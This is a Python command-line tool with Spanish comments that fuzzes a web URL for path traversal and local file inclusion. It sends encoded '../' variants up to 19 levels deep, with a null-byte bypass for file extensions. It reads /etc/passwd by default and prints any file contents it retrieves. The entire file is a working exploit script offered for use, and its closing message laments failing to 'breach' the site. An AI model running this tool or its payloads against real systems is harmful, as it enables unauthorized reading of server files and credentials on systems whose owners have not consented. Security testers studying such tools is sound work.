#!/usr/bin/env python
import sys
from Colors import * 
from signal import SIGINT, signal
import urllib3, argparse 
import threading

def ctrl_c(signal, frame):
    print(f"\n{bright_red}[!] Saliendo...{end}\n\n")
    sys.exit(1)

# Ctrl + c
signal(signalnum=SIGINT, handler=ctrl_c)

# Manejador de conexiones
http = urllib3.PoolManager()

# Ignorar certificado SSL
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Tipos de payloads
variants = ['../', '....//', '..%252f', '....%2F%2F', '....%252F%252F']

# Null Byte Injection, sirve para bypass
nil = '%00'

found = False

# Envio de payloads
def send_payload(payload):
    #print(payload)
    global found
    try:
        response = http.request(method='GET', url=payload)
    except urllib3.exceptions.HTTPError as e:
        pass 
    else:
        if response.status == 200:
            print(f"{bright_white}Encontrado: {bright_cyan}{response.url}{bright_white} -{bright_green} Código de estado:{bright_blue} {response.status}{end}\n{bright_white}Archivo: \n{response.data.decode()}")
            found = True
            

# Construcción de paylods a enviar
def build_payload(target, extension, file, parser):

    if 'FUZZ' not in target:
        print(f"\n{bright_red}[!]Formato incorrecto, necesitas proporcionar el campo a fuzzear!{bright_white}\n")
        parser.print_help()
        sys.exit(1)


    threads = []  # Para almacenar los hilos y asegurarse de que todos terminen

    if target.replace('FUZZ', '').endswith('/'):
        payload = target.replace('FUZZ', file.lstrip('/') + (nil + extension if extension else ''))
        payload = payload[:-1] if payload.endswith('/') else payload  # Eliminar solo una "/"
        thread = threading.Thread(target=send_payload, args=(payload,))
        thread.start()
        threads.append(thread)
    else:
        thread = threading.Thread(target=send_payload, args=(target.replace('FUZZ', file + (nil + extension if extension else '')),))
        thread.start()
        threads.append(thread)

    if file.startswith('/'):
        file = file.lstrip('/')
    if extension:
        if not extension.startswith('.'):
            extension = "." + extension 

    for variant in variants:
        if found:
            break
        for recoil in range(1, 20):
            if not extension:
                payload = (variant * recoil + file)
            else:
                payload = (variant * recoil + file + nil + extension)

            thread = threading.Thread(target=send_payload, args=(target.replace('FUZZ', payload),))
            thread.daemon = True
            thread.start()
            threads.append(thread)

    # Esperar a que todos los hilos terminen
    for thread in threads:
        thread.join()
    
    if not found:
        print(f"\n{bright_blue}[*] {bright_white}Lamentamos que no hayas podido vulnerar la web :(\n{end}")
        parser.print_help()

def main():

    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', type=str, required=True, dest='target', help='URL que sera auditado, ejemplo: (https://firefox.com/?users=FUZZ)')
    parser.add_argument('-x', '--extension', type=str, required=False, dest='extension', help='Buscar por un archivo con un tipo de extension, ejemplo: (.jpg | jpg)')
    parser.add_argument('-f', '--file', type=str, required=False, default='/etc/passwd', dest='file', help='Archivo a leer del sistema, por defecto sera el /etc/passwd')

    opt = parser.parse_args()

    build_payload(target=opt.target, extension=opt.extension, file=opt.file, parser=parser)    

if __name__ == "__main__":
    main()
